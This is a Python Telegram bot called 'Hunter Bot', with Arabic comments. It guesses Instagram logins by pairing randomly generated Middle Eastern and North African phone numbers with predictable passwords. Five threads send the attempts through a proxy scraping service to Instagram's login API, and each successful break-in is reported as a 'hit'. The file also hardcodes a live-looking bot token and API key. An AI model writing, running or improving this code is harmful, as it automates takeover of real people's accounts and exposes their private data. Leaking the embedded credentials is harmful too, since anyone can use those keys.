# ==============================================================================
#  HUNTER BOT - v1.0 (Optimized for Render)
# ==============================================================================
import os
import requests
import random
import time
import threading
import json
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# --- إعدادات أساسية ---
# تم وضع التوكن الجديد الذي أرسلته
HUNTER_TOKEN = "5206810794:AAFu-YNHQaWPY_VCcjayVUvAmueAZDoksjA" 
CHAT_ID = "1148797883"
SCRAPER_API_KEY = "da54f75953fed511420acb3003111fa0"

# --- متغيرات الحالة العامة ---
is_running = False
hits = 0
fails = 0
last_event = "Hunter is idle."
start_time = None
current_target = "None"
network_map = {
    '1': ("Asia (Iraq)", "964", "077"), '2': ("Zain (Iraq)", "964", "078"),
    '3': ("Libya (091)", "218", "91"), '4': ("Libya (092)", "218", "92"),
    '5': ("MCI (Iran)", "98", "91"), '6': ("Irancell (Iran)", "98", "93"),
    '7': ("Vodafone (Egypt)", "20", "10"), '8': ("Orange (Egypt)", "20", "12"),
    '9': ("Ooredoo (Kuwait)", "965", "6"), '10': ("Vodafone (Qatar)", "974", "77")
}
current_hunter_config = {}

# --- إعدادات Flask لخادم الويب ---
app = Flask(__name__)
@app.route('/')
def home():
    return "Hunter bot is alive!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# --- دالة فحص الحسابات (Hunter) مع "البداية الذكية" ---
def hunter_worker():
    global hits, fails, last_event
    country_code = current_hunter_config["country"]
    prefix = current_hunter_config["prefix"]
    
    while is_running:
        random_suffix = random.randint(1000000, 9999999)
        phone_suffix = str(random_suffix)
        
        username = f"{country_code}{prefix}{phone_suffix}"
        password = f"{prefix}{phone_suffix}"
        
        try:
            target_url = 'https://i.instagram.com/api/v1/accounts/login/'
            payload = {
                'api_key': SCRAPER_API_KEY,
                'url': target_url,
                'method': 'POST',
                'body': f'username={username}&password={password}&queryParams=%7B%7D&optIntoOneTap=false',
                'headers': {
                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            }
            response = requests.post('http://api.scraperapi.com', json=payload, timeout=90)

            if 'logged_in_user' in response.text:
                hits += 1
                last_event = f"🎯 HIT! @{username}"
            else:
                fails += 1
                last_event = f"Checked @{username}"
        except Exception as e:
            fails += 1
            last_event = f"Hunter Error: {e}"
        
        time.sleep(2)

# --- المدير العام للمهام ودوال البوت ---
def main_task_manager(target):
    global is_running, start_time, current_target, hits, fails, current_hunter_config
    is_running = True
    start_time = time.time()
    hits, fails = 0, 0
    network_info = network_map[target]
    current_hunter_config = {"name": network_info[0], "country": network_info[1], "prefix": network_info[2]}
    current_target = network_info[0]
    worker_threads = [threading.Thread(target=hunter_worker) for _ in range(5)]
    for t in worker_threads: t.start()

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton(v[0], callback_data=f'hunt_{k}')] for k, v in network_map.items()]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('Welcome to Hunter Bot. Select a network to start hunting:', reply_markup=reply_markup)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running
    if not is_running:
        await update.message.reply_text("Hunter is not running.")
        return
    is_running = False
    await update.message.reply_text("🛑 Stopping hunter... Please wait for workers to finish their current cycle.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = "N/A"
    if start_time:
        uptime_seconds = int(time.time() - start_time)
        minutes, seconds = divmod(uptime_seconds, 60)
        uptime = f"{minutes:02}:{seconds:02}"
    speed = 0
    if start_time and (hits + fails) > 0:
        elapsed = time.time() - start_time
        speed = (hits + fails) / elapsed * 60 if elapsed > 0 else 0
    
    status_msg = (f"📊 Hunter Bot Status 📊\n"
                  f"--------------------------------\n"
                  f"🎯 Target: {current_target}\n"
                  f"⏳ Uptime: {uptime}\n"
                  f"--------------------------------\n"
                  f"✅ Hits: {hits}\n"
                  f"❌ Fails: {fails}\n"
                  f"⚡️ Speed: {speed:.1f} attempts/min\n"
                  f"--------------------------------\n"
                  f"💬 Last Event: {last_event}")
    await update.message.reply_text(status_msg)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if is_running:
        await query.edit_message_text(text="⚠️ A task is already running. Use /stop to stop it first.")
        return
    if query.data.startswith('hunt_'):
        network_key = query.data.split('_')[1]
        network_name = network_map[network_key][0]
        await query.edit_message_text(text=f"🕵️‍♂️ Starting smart hunt for {network_name}...")
        thread = threading.Thread(target=main_task_manager, args=(network_key,))
        thread.start()

def run_bot():
    application = Application.builder().token(HUNTER_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    print("Hunter Bot is up and running...")
    application.run_polling()

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask); flask_thread.daemon = True; flask_thread.start()
    run_bot()
